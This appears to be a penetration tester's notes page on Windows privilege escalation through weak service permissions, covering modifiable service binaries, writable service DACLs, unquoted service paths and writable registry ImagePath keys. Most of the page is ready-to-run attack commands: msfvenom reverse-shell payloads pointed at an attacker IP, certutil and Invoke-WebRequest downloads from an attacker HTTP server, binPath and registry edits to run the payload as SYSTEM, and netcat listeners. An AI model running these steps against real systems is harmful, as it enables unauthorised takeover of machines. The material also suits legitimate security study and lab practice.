---
Primary_category: "[[WINDOWS PRIVESC]]"
title: "WINDOWS SERVICES WEAK PERMISSIONS ABUSE"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[WINDOWS PRIVESC]]

#### *Enumeration*

##### *SharpUp*

> ***[SharpUp](https://github.com/GhostPack/SharpUp/)***

###### *Setup*

- ***Downloading the binary***

> ***From the attacker*** ⚔️

```bash
curl --silent --location --request GET --output 'https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/SharpUp.exe'
```

- ***Transferring it to the target***

> ***From the attacker*** ⚔️

```bash
python3 -m http.server 80
```

> ***From the target*** 🎯

```bash
mkdir C:\Windows\Temp\LPE
cd C:\Windows\Temp\LPE
```

```bash
certutil.exe -urlcache -split -f 'http://<ATTACKER_IP>/SharpUp.exe'
```

###### *Usage*

```bash
.\SharpUp.exe audit
```

---

#### *Permissive File System ACLs*

##### *Service Binary Path*

> ***i.e. Service Binary NTFS ACL***

Let's suppose we compromise a web application running on a *Windows* system and we achive *RCE*, so we send a ***[[SHELLS AND PAYLOADS#Reverse Shell|Reverse Shell]]*** to our attacker machine

###### *Enumerating the system DACLs*

Once we have access to the system, we transfer to the target a tool that can audit any existing *ACE* within the *DACL* of each *object's security descriptor* in the system

```bash
.\SharpUp.exe audit
```

> [!NOTE]- *Command Output*
>
> ```bash
> <SNIP> 
> === Modifiable Service Binaries ===
> 
>   Name             : SecurityService
>   DisplayName      : PC Security Management Service
>   Description      : Responsible for managing PC security
>   State            : Stopped
>   StartMode        : Auto
>   PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
>   <SNIP>
> ```
>

###### *Verifying permissions over the given resource*

We find out that there is a modifiable binary related to a certain service. We can list the *DACL* of the binary in question as follows

> ***CMD & PS***

```bash
icacls '<BINARY_PATH>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> icacls 'C:\Program Files (x86)\PCProtect\SecurityService.exe'
> ```
>

> ***PS***

```bash
Get-ACL '<BINARY_PATH>' | Select -ExpandProperty accessToString
```

> [!DANGER]- *e.g.*
>
> ```bash
> Get-ACL 'C:\Program Files (x86)\PCProtect\SecurityService.exe' | Select -ExpandProperty accessToString
> ```
>

###### *Checking if the given service is running as LOCAL SYSTEM*

Once we check that we have *FULL CONTROL* or other permissions that allow us to replace the given binary with a malicious one, we should check as which user the current service is running as

> ***PS***

```bash
Get-CIMInstance -ClassName win32_service -Filter 'Name="<SERVICE_NAME>"' | Select -ExpandProperty startName
```

> [!DANGER]- *e.g.*
>
> ```bash
> Get-CIMInstance -ClassName win32_service -Filter 'Name="SecurityService"' | Select -ExpandProperty startName
> ```
>

If the service is running as *LOCAL SYSTEM* or another privileged user, we can proceed as follows

###### *Generating a malicious payload*

> ***From the attacker***  ⚔️

```bash
msfvenom --payload windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> --arch x64 --platform windows --format exe --out rev.exe
```

###### *Backing up the legitimate binary*

```bash
mkdir C:\Windows\Temp\LPE
cd C:\Windows\Temp\LPE
```

```bash
Copy-Item -Path '<BINARY_PATH>' -Destination 'C:\Windows\Temp\LPE\<BINARY>.bk'
```

> [!DANGER]- *e.g.*
>
> ```bash
> Copy-Item -Path 'C:\Program Files (x86)\PCProtect\SecurityService.exe' -Destination 'C:\Windows\Temp\LPE\SecurityService.exe.bk'
> ```
>

###### *Transferring it to the target*

> ***From the attacker*** ⚔️

```bash
python3 -m http.server 80
```

> ***From the target*** 🎯

```bash
IWR -UseBasicParsing -Uri 'http://<ATTACKER_IP>/rev.exe' -OutFile '<BINARY_PATH>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> IWR -UseBasicParsing -Uri 'http://10.10.15.63/rev.exe' -OutFile 'C:\Program Files (x86)\PCProtect\SecurityService.exe'
> ```
>

###### *Setting up a TCP Listener*

```bash
rlwrap -CaR nc -nlvp <TCP_PORT>
```

###### *Restarting the service*

```bash
sc stop <SERVICE_NAME>
sc start <SERVICE_NAME>
```

> [!DANGER]- *e.g.*
>
> ```bash
> sc start SecurityService
> sc stop SecurityService
> ```
>

###### *Cleanup*

- ***Restoring the legitimate binary***

```bash
Copy-Item -Path 'C:\Windows\Temp\LPE\<LEGITIMATE_BINARY>' -Destination '<LEGITIMATE_BINARY_PATH>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> Copy-Item -Path 'C:\Windows\Temp\LPE\SecurityService.exe.bk' -Destination 'C:\Program Files (x86)\PCProtect\SecurityService.exe'
> ```
>

- ***Restarting the service to ensure that its works properly***

```bash
sc.exe stop <SERVICE_NAME>
sc.exe start <SERVICE_NAME>
```

> [!DANGER]- *e.g.*
>
> ```bash
> sc.exe stop SecurityService
> sc.exe start SecurityService
> ```
>

- ***Verifying service is running***

> ***CMD & PS***

```bash
sc.exe queryex '<SERVICE_NAME>'
```

> ***PS***

```bash
Get-CIMInstance -ClassName win32_service -Filter 'name="<SERVICE_NAME>"' | Select -ExpandProperty state
```

---

#### *Weak Service Permissions*

> ***i.e. Service DACL as a Securable Object***

##### *Workflow*

Continuing with the previous case, after compromising a web application and establish a remote connection to the target through a reverse shell, we start by enumerating the *DACL* of any securable object looking for any existing weak permissions or misconfiguration

```bash
.\SharpUp.exe audit
```

> [!NOTE]- *Command Output*
>
> ```bash
> <SNIP>
> Modifiable Services
>  
>   Name             : WindscribeService
>   DisplayName      : WindscribeService
>   Description      : Manages the firewall and controls the VPN tunnel
>   State            : Running
>   StartMode        : Auto
>   PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
> <SNIP>
> ```
>

This means that we have some kind of privileged right over the service object and we could probably leverage this right to gain code execution as the user account running the given service, which is probably a more privileged principal than the current user

##### *Requirements*

- ***The controlled principal must have privileged permissions over the service object***

> ***e.g. SERVICE_ALL_ACCESS***

##### *Abuse*

###### *Listing the Service's DACL*

> ***[Sysinternal's accesschk.exe](https://learn.microsoft.com/es-es/sysinternals/downloads/accesschk)***

- ***Setup***

***Downloading the binary***

> ***From the attacker*** ⚔️

```bash
curl --silent --location --request GET --remote-name 'https://live.sysinternals.com/accesschk.exe'
```

***Transferring it to the target***

> ***From the attacker*** ⚔️

```bash
python3 -m http.server 80
```

> ***From the target*** 🎯

```bash
mkdir C:\Windows\Temp\LPE
cd C:\Windows\Temp\LPE
```

```bash
certutil.exe -urlcache -split -f 'http://<ATTACKER_IP>/accesschk.exe'
```

- ***Usage***

```bash
.\accesschk.exe /accepteula -quvcw <SERVICE_NAME>
```

> [!DANGER]- *e.g.*
>
> ```bash
> accesschk.exe /accepteula -quvcw WindscribeService
> ```
>

Having verified that the current user has privileged rights over the service in question, such as *SERVICE_ALL_ACCESS*, as stated, we can gain code execution as the user account running the service

###### *Checking if the given service is running as LOCAL SYSTEM*

To do so, first we have to check if the service in question is running as *LOCAL SERVICE* or another privileged system account. We do this basically to know if once we carry out the remaining steps of the workflow and gain code execution as the user in question, we achieve a more elevated and privileged security context

> ***PS***

```bash
Get-CIMInstance -ClassName win32_service -Filter 'Name="<SERVICE_NAME>"' | Select -ExpandProperty startName
```

> [!DANGER]- *e.g.*
>
> ```bash
> Get-CIMInstance -ClassName win32_service -Filter 'Name="WindscribeService"' | Select -ExpandProperty startName
> ```
>

If the service is running as *LOCAL SYSTEM* or another privileged user, we can just simply create a malicious payload from our side, transfer it to the target and replace the binary path of the given service with it

###### *Listing the current service's binary path*

> ***PS***

```bash
Get-CimInstance -ClassName win32_service -Filter 'name="<SERVICE_NAME>"' | Select -ExpandProperty PathName
```

> [!DANGER]- *e.g.*
>
> ```bash
> Get-CimInstance -ClassName win32_service -Filter 'name="WindscribeService"' | Select -ExpandProperty PathName
> ```
>

###### *Generating a malicious payload*

> ***From the attacker***  ⚔️

```bash
msfvenom --payload windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> --arch x64 --platform windows --format exe --out rev.exe
```

###### *Transferring it to the target*

> ***From the attacker*** ⚔️

```bash
python3 -m http.server 80
```

> ***From the target*** 🎯

```bash
mkdir C:\Windows\Temp\LPE
cd C:\Windows\Temp\LPE
```

```bash
certutil.exe -urlcache -split -f 'http://<ATTACKER_IP>/rev.exe'
```

###### *Modifying the binary path of the service*

> ***From the target*** 🎯

> ***CMD & PS***

```bash
sc.exe config <SERVICE_NAME> binPath= 'C:\Windows\Temp\LPE\rev.exe'
```

> [!DANGER]- *e.g.*
>
> ```bash
> sc.exe config WindscribeService binPath= "C:\Windows\Temp\LPE\rev.exe"
> ```
>

###### *Setting up a TCP Listener*

> ***From the attacker*** ⚔️

```bash
rlwrap -CaR nc -nlvp <TCP_PORT>
```

###### *Restarting the service*

> ***CMD & PS***

```bash
sc.exe stop <service_name>
sc.exe start <service_name>
```

> [!DANGER]- *e.g.*
>
> ```bash
> sc.exe start WindscribeService
> sc.exe stop WindscribeService
> ```
>

###### *Cleanup*

- ***Restoring the original service's binary path***

```bash
sc.exe config <SERVICE_NAME> binPath= '<LEGITIMATE_BINARY_PATH>'
```

- ***Restarting the service to ensure that its works properly***

```bash
sc.exe stop <SERVICE_NAME>
sc.exe start <SERVICE_NAME>
```

- ***Verifying service is running***

> ***CMD & PS***

```bash
sc.exe queryex '<SERVICE_NAME>'
```

> ***PS***

```bash
Get-CIMInstance -ClassName win32_service -Filter 'name="<SERVICE_NAME>"' | Select -ExpandProperty state
```

---

#### *Unquoted Service Path*

##### *Workflow*

When a service is created on a *Windows* machine, its registry configuration specifies the absolute path to the binary that will run once the service initialization is triggered

It its path is not encapsulated within quotes, it may be susceptible to some hijack techniques

We must bear in mind that if we have have the folllowing path without being encapsulated within quotes

```bash
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

Then, the *Windows* system will attempt to load a binary from each directory of the path, in the followin order

```bash
C:\Program.exe
C:\Program Files.exe
C:\Program Files (x86)\System.exe
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

With this in mind, if there is any misconfigured *ACE* within the *DACL* of any of the directories above, we can create a binary file with the same name as one of the ones listed above

So that binary will be executed when we restart the service

The caveat of this approach or technique is that an standard user account rarely has write permissions over one of the mentioned directories or is able to restart a service

##### *Requirements*

- ***The Binary Path of the given service must be unquoted***

- ***The controlled user account must have write permissions over one of the legitimate binary path directories***

- ***The controlled user account must be able to restart the service in question***

##### *Abuse*

###### *Searching for Unquoted Service Paths*

```bash
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

###### *Checking if the given service is running as LOCAL SYSTEM*

> ***PS***

```bash
Get-CIMInstance -ClassName win32_service -Filter 'Name="<SERVICE_NAME>"' | Select -ExpandProperty startName
```

> [!DANGER]- *e.g.*
>
> ```bash
> Get-CIMInstance -ClassName win32_service -Filter 'Name="SystemExplorerHelpService"' | Select -ExpandProperty startName
> ```
>

> [!NOTE]- *Command Output*
>
> ```bash
> LocalSystem
> ```
>

###### *Listing the current service's binary path*

> ***PS***

```bash
Get-CimInstance -ClassName win32_service -Filter 'name="<SERVICE_NAME>"' | Select -ExpandProperty PathName
```

> [!DANGER]- *e.g.*
>
> ```bash
> Get-CimInstance -ClassName win32_service -Filter 'name="WindscribeService"' | Select -ExpandProperty PathName
> ```
>

> [!NOTE]- *Command Output*
>
> ```bash
> C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
> ```
>

###### *Verifying Write Permissions over one of the service's binary path directories*

> ***CMD & PS***

```bash
icacls '<DIRECTORY>'
```

> ***PS***

```bash
Get-ACL '<DIRECTORY>' | Select accessToString
```

Once we verify that we have *WRITE* permission over one of the directories, we can just create a malicious binary from our side, upload it to the target and stored it within the directory in question

Then, we simply restart the service if can. If not, all we can do is wait

###### *Generating a malicious payload*

> ***From the attacker***  ⚔️

```bash
msfvenom --payload windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> --arch x64 --platform windows --format exe --out rev.exe
```

###### *Transferring it to the target*

Let's suppose that we have *WRITE* permissions over **`C:\Program Files (x86)`**, just proceed as follows

> ***From the attacker*** ⚔️

```bash
python3 -m http.server 80
```

> ***From the target*** 🎯

```bash
IWR -UseBasicParsing -Uri 'http://<ATTACKER_IP>/rev.exe' -OutFile 'C:\Program Files (x86)\System.exe'
```

###### *Restarting the service*

> ***CMD & PS***

```bash
sc.exe stop <SERVICE_NAME>
sc.exe start <SERVICE_NAME>
```

###### *Cleaning Up*

- ***Deleting the malicious binary from the writable directory***

```bash
Remove-Item -Path -Force 'C:\Program Files (x86)\System.exe'
```

---

#### *Weak Permissions on Windows Registry DACLs*

##### *Workflow*

As we have mentioned several times, once we establish a remote connection to the target through any technique, such as a *reverse shell* or ***[[5985, 5986 - WINRM|WinRM]]***, we have to start enumerating the system to look for any security flaw or misconfiguration

After checking most things, we decide to enumerate the *DACL* of any *Windows Registry Hive* and its corresponding keys to see if we have write permissions over one of them

Then, we find out that we have *WRITE* permissions over the registry hive of a certain service, so we can replace the value of its *imagePath* property with a malicious binary

This way, when the given service is restarted, the malicious binary will be executed and we will achieve code execution as the user running the service

##### *Requirements*

- ***The compromised user account must have WRITE permissions over either the entire service's registry hive or its imagePath***

- ***The compromised user account must be able to restart the service in question***

> ***Otherwise, we will have to wait for it to restart***

##### *Abuse*

###### *Checking for Weak Service ACLs in Windows Registry*

> ***[Sysinternal's accesschk.exe](https://learn.microsoft.com/es-es/sysinternals/downloads/accesschk)***

- ***Setup***

> ***See the setup process [[#Listing the Service's DACL|here]]***

- ***Usage***

```bash
cmd.exe /c .\acceschk.exe /accepteula %USERNAME% -kvuqsw 'HKLM\System\CurrentControlSet\Services'
```

> [!DANGER]- *e.g.*
>
> ```bash
> RW HKLM\System\CurrentControlSet\services\ModelManagerService
>         KEY_ALL_ACCESS
> ```
>

###### *Checking if the given service is running as LOCAL SYSTEM*

> ***PS***

```bash
Get-CIMInstance -ClassName win32_service -Filter 'Name="<SERVICE_NAME>"' | Select -ExpandProperty startName
```

> [!DANGER]- *e.g.*
>
> ```bash
> Get-CIMInstance -ClassName win32_service -Filter 'Name="ModelManagerService"' | Select -ExpandProperty startName
> ```
>

> [!NOTE]- *Command Output*
>
> ```bash
> LocalSystem
> ```
>

###### *Listing the legitimate service's image path*

> ***CMD & PS***

```bash
reg query 'HKLM\System\CurrentControlSet\Services\ModelManagerService' /v 'imagePath'
```

> ***PS***

```bash
Get-ItemProperty -Path 'HKLM:System\CurrentControlSet\Services\ModelManagerService' -Name 'imagePath'
```

###### *Generating a malicious payload*

> ***From the attacker***  ⚔️

```bash
msfvenom --payload windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> --arch x64 --platform windows --format exe --out rev.exe
```

###### *Transferring it to the target*

> ***From the attacker*** ⚔️

```bash
python3 -m http.server 80
```

> ***From the target*** 🎯

```bash
mkdir C:\Windows\Temp\LPE
cd C:\Windows\Temp\LPE
```

```bash
certutil.exe -urlcache -split -f 'http://<ATTACKER_IP>/rev.exe'
```

###### *Modifying the service's Image Path*

> ***CMD & PS***

```bash
reg add 'HKLM\System\CurrentControlSet\Services\ModelManagerService' /v 'ImagePath' /t 'REG_EXPAND_SZ' /d 'C:\Windows\Temp\LPE\rev.exe' /f
```

> ***PS***

```bash
Set-ItemProperty -Path 'HKLM:System\CurrentControlSet\Services\ModelManagerService' -Name 'ImagePath' -Value 'C:\Windows\Temp\LPE\rev.exe'
```

###### *Restarting the service*

> ***CMD & PS***

```bash
sc.exe stop <SERVICE_NAME>
sc.exe start <SERVICE_NAME>
```

###### *Cleaning Up*

- ***Replacing the current service's imagePath with the legitimate binary***

> ***CMD & PS***

```bash
reg add 'HKLM\System\CurrentControlSet\Services\ModelManagerService' /v 'ImagePath' /t 'REG_EXPAND_SZ' /d '<LEGITIMATE_BINARY_PATH>' /f
```

> ***PS***

```bash
Set-ItemProperty -Path 'HKLM:System\CurrentControlSet\Services\ModelManagerService' -Name 'ImagePath' -Value '<LEGITIMATE_BINARY_PATH>'
```